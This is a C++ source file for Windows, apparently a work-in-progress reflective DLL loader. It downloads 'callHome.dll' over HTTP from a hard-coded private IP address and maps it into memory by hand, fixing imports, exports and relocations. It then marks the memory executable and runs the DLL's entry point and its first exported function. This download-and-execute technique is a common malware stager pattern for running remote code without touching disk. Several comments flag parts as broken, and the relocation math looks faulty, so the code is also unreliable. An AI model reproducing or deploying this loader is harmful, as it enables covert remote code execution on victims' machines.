#include <stdio.h>
#include <Windows.h>
#include <cstring>
#include <winhttp.h>


//#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "winhttp.lib")

char* downloadPE(HANDLE hHeap, HANDLE  hProcess, LPVOID lpHeapBuffer, int iBufferSize,LPCWSTR lpHostName, LPCWSTR lpDllName) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    HANDLE hThread;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, lpHostName,
            INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", lpDllName,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            NULL
            //WINHTTP_FLAG_SECURE
        );

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);


    int iOffset = 0;
    // Keep checking for data until there is nothing left.
    if (bResults && iOffset <= iBufferSize)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());

                }
                else
                {
                    printf("%s", pszOutBuffer);
                    //ReadFile(hRequest, &lpHeapBuffer[iOffset], dwSize+1, NULL, NULL)
                    // could also go with virtual alloc
                    std::memcpy((LPVOID)(((char*)lpHeapBuffer + iOffset)), pszOutBuffer, dwSize);

                }
                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
                iOffset += dwSize;
            }
        } while (dwSize > 0);
    }
    char* bpBuffer = (char*)lpHeapBuffer;

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bpBuffer;
}






int mapSections(uintptr_t lpImage, char* bpBuffer, IMAGE_DOS_HEADER* lpDosHeaderOld, IMAGE_NT_HEADERS* lpPeHeaderOld) {


    //map header
    std::memcpy((void*)lpImage, bpBuffer, 0x1000);

    //map sections
    int iNumberSections = lpPeHeaderOld->FileHeader.NumberOfSections;
    DWORD iOffsetStartSectionHeader = lpDosHeaderOld->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    auto lpStartSectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(bpBuffer + iOffsetStartSectionHeader);
    int iVSectionAlign = lpPeHeaderOld->OptionalHeader.SectionAlignment;
    int iOverflowSection = 0;
    for (int i = 0; i < iNumberSections; i++) {
        //map each section at the correct offset
        std::memcpy((LPVOID*)(lpImage + (DWORD)iVSectionAlign * (i + 1 + iOverflowSection)), bpBuffer + lpStartSectionHeader[i].PointerToRawData, iVSectionAlign);

        int s = lpStartSectionHeader[i].SizeOfRawData;
        if (s > iVSectionAlign) {
            int iCurrentOverflowSection = s / iVSectionAlign;
            for (int k = 1; k <= iCurrentOverflowSection; k++) {
                std::memcpy((LPVOID*)(lpImage + (DWORD)iVSectionAlign * (i + 1 + iOverflowSection + k)), bpBuffer + lpStartSectionHeader[i].PointerToRawData + (DWORD)iVSectionAlign * k, iVSectionAlign);
            }
            iOverflowSection += iCurrentOverflowSection;
        }


    }
    return 0;
}




int fixImports(uintptr_t lpImage, IMAGE_NT_HEADERS* lpPeHeader) {
    //fix image base
    std::memcpy(&(lpPeHeader->OptionalHeader.ImageBase), &lpImage, sizeof(lpPeHeader->OptionalHeader.ImageBase));
    //fix imports                              fix this !!!
    auto lpImportDirectory = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + lpImage);
    // each directory entry has a size of 4 bytes*5 one directory is always empty
    int iNumberOfImports = (lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / (4 * 5)) - 1;
    for (int i = 0; i < iNumberOfImports; i++) {
        //might need to fix this
        HMODULE hDLLModule = LoadLibraryA((LPCSTR)(lpImportDirectory[i].Name + lpImage));
        //go over each IAT entry
        for (int k = 0; k < lpPeHeader->OptionalHeader.SectionAlignment; k += sizeof(uintptr_t)) {
            //check if entry is 00000 aka end of imports
            if (!*(uintptr_t*)(lpImportDirectory[i].OriginalFirstThunk + k + lpImage))
                break;
            // load proc address by name in INT
            // k describes the distanc between name pointers +2== hintsize
            DWORD* dwTableNamePointer = (DWORD*)(lpImportDirectory[i].OriginalFirstThunk + k + lpImage);
            uintptr_t* dwTableAddressPointer = (uintptr_t*)(lpImportDirectory[i].FirstThunk + k + lpImage);
            LPCSTR lpszProcName = (LPCSTR)(*dwTableNamePointer) + 2 + lpImage;
            auto lpProcAddress = GetProcAddress(hDLLModule, lpszProcName);
            // copy proc address to the IAT 
            std::memcpy(dwTableAddressPointer, &lpProcAddress, sizeof(lpProcAddress));
        }

    }
    return 0;
}

int fixExports(uintptr_t lpImage, IMAGE_NT_HEADERS* lpPeHeader) {

    //fix Exports                              fix this !!!
    auto lpExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + lpImage);

    int iNumberOfExports = lpExportDirectory->NumberOfFunctions;
    for (int i = 0; i < iNumberOfExports; i++) {
        //might need to fix this


        DWORD* lpTableNamePointer = (DWORD*)((lpExportDirectory->AddressOfNames) + i * 4 + lpImage);
        uintptr_t lpTableNamePointerTVA = (lpImage + *lpTableNamePointer);
        std::memcpy((void*)lpTableNamePointer, &lpTableNamePointerTVA, sizeof(lpTableNamePointerTVA));

        DWORD* lpTableFunctionsPointer = (DWORD*)((lpExportDirectory->AddressOfFunctions) + i * 4 + lpImage);
        uintptr_t lpTableFunctionsPointerTVA = (lpImage + *lpTableFunctionsPointer);
        std::memcpy((void*)lpTableFunctionsPointer, &lpTableFunctionsPointerTVA, sizeof(lpTableFunctionsPointerTVA));

    }
    return 0;
}

int fixRelocations(uintptr_t lpImage, IMAGE_NT_HEADERS* lpPeHeader, IMAGE_NT_HEADERS* lpPeHeaderOld) {
    //fix relocations
    int iSizeCounter = lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    auto lpBaseRelocDir = reinterpret_cast<IMAGE_BASE_RELOCATION*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + lpImage);
    uintptr_t dwImageBaseOld = lpPeHeaderOld->OptionalHeader.ImageBase;


    //DWORD iImageBaseNewDelta = lpImage - dwImageBaseOld;

    DWORD dwRVABlock;
    DWORD dwRVABlockSize;

    for (int iOffsetReloc = 0; iOffsetReloc < iSizeCounter;) {
        dwRVABlock = (reinterpret_cast<IMAGE_BASE_RELOCATION*>(iOffsetReloc + (BYTE*)lpBaseRelocDir))->VirtualAddress;
        dwRVABlockSize = (reinterpret_cast<IMAGE_BASE_RELOCATION*>(iOffsetReloc + (BYTE*)lpBaseRelocDir))->SizeOfBlock;

        //skip last entry
        for (int k = sizeof(DWORD) * 2; k < dwRVABlockSize - sizeof(WORD); k += sizeof(WORD)) {
            WORD* lpFixupAddress = (WORD*)((BYTE*)lpBaseRelocDir + k + iOffsetReloc);
            uintptr_t* lpAddressToChange = (uintptr_t*)((*lpFixupAddress & 0x0FFF) + dwRVABlock + lpImage);
            uintptr_t lpNewAddress = ((*lpAddressToChange ^ dwImageBaseOld) + lpImage);
            std::memcpy((void*)lpAddressToChange, &lpNewAddress, sizeof(uintptr_t));
        }
        iOffsetReloc += dwRVABlockSize;

    }

    return 0;
}

int main(int argc, char* argv[]) {


    LPVOID lpHeapBuffer;
    LPSTR pszDecrypt;
    LPSTR pszOutBuffer;
    HANDLE hProcess;
    HANDLE hHeap;
    DWORD dwProcessId;
    LPCWSTR lpHostName = L"192.168.138.145";
    LPCWSTR lpDllName = L"callHome.dll";

    // this will determine the maximum size of the dll u can download in bytes
    int iBufferSize = 20000;

    //could be GetCurrentProcss <- retrieves pseudo handle ||FindWindowA 
    //-> GetProcessId aswell
    dwProcessId = GetProcessId((HANDLE)-1);
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
    if (!hProcess) {
        printf("couldnt close process handle 0x%X", GetLastError());
        return -1;
    }


    hHeap = GetProcessHeap();
    if (!hHeap) {
        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    lpHeapBuffer = HeapAlloc(hHeap, NULL, iBufferSize);
    if (!lpHeapBuffer) {
        printf("couldnt allocate bytes on the heap 0x%X\n", GetLastError());
        CloseHandle(hHeap);
        CloseHandle(hProcess);
        return -1;
    }

    char* bpBuffer = downloadPE(hHeap, hProcess, lpHeapBuffer, iBufferSize,lpHostName,lpDllName);

    //BOOL VirtualProtectEx(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
    //BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);
    auto lpDosHeaderOld = reinterpret_cast<IMAGE_DOS_HEADER*>(bpBuffer);
    auto lpPeHeaderOld = reinterpret_cast<IMAGE_NT_HEADERS*>(bpBuffer + lpDosHeaderOld->e_lfanew);
    uintptr_t  lpImage = (uintptr_t)VirtualAlloc(NULL, lpPeHeaderOld->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!lpImage) {
        printf("couldnt allocate memory : 0x%X\n", GetLastError());
        HeapFree(hHeap, 0, lpHeapBuffer);
        CloseHandle(hProcess);
        return 0;
    }

    mapSections(lpImage, bpBuffer, lpDosHeaderOld, lpPeHeaderOld);


    auto lpPeHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(lpImage + lpDosHeaderOld->e_lfanew);

    fixImports(lpImage, lpPeHeader);

    fixExports(lpImage, lpPeHeader);

    fixRelocations(lpImage, lpPeHeader, lpPeHeaderOld);

    int iSizeOfCode = lpPeHeader->OptionalHeader.SectionAlignment;
    printf("\nBase of Image%x\n", lpImage);
    printf("\nBase of Code%x\n", lpPeHeader->OptionalHeader.BaseOfCode);
    //                                                                              64 vs 32 bit on base of code
    //if (VirtualProtect((LPVOID)((DWORD)lpImage+ 0x1000), lpPeHeader->OptionalHeader.BaseOfData - lpPeHeader->OptionalHeader.BaseOfCode, PAGE_EXECUTE_READ, NULL))
    if (VirtualProtect((LPVOID)(lpImage), lpPeHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, NULL))
        printf("Coldnt change PAGE protection: %x\n", GetLastError());


    LPTHREAD_START_ROUTINE lpEntry = (LPTHREAD_START_ROUTINE)(lpPeHeader->OptionalHeader.AddressOfEntryPoint + lpImage);

    HANDLE hThreadInjected = CreateThread(NULL, 0, lpEntry, NULL, DLL_PROCESS_ATTACH, NULL);
    if (!hThreadInjected) {
        printf("thread couldnt be created with error: %x", GetLastError());


    }
    // load my doStuff function
    auto lpExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpPeHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + lpImage);
    auto lpEATFirstFunc = (uintptr_t*)(lpExportDirectory->AddressOfFunctions + lpImage);
    FARPROC  doStuff = (FARPROC)*lpEATFirstFunc;
    doStuff();

    HeapFree(hHeap, 0, lpHeapBuffer);
    //CloseHandle(hHeap);
    for (int i = 0; i < 10000; i++) {
        Sleep(1);
    }
    CloseHandle(hProcess);

    return 0;

}